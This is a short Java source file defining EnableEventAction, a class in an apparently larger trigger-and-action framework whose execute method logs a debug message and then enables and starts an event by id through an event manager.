package com.android.networking.action;

import com.android.networking.Trigger;
import com.android.networking.auto.Cfg;
import com.android.networking.conf.ConfAction;
import com.android.networking.manager.ManagerEvent;
import com.android.networking.util.Check;

public class EnableEventAction extends EventAction {
	private static final String TAG = "EnableEventAction";

	public EnableEventAction(ConfAction params) {
		super(params);
	}

	@Override
	public boolean execute(Trigger trigger) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (execute): " + eventId);//$NON-NLS-1$
		}
		
		final ManagerEvent eventManager = ManagerEvent.self();

		eventManager.enable(eventId);
		eventManager.start(eventId);
		
		return true;
	}

}
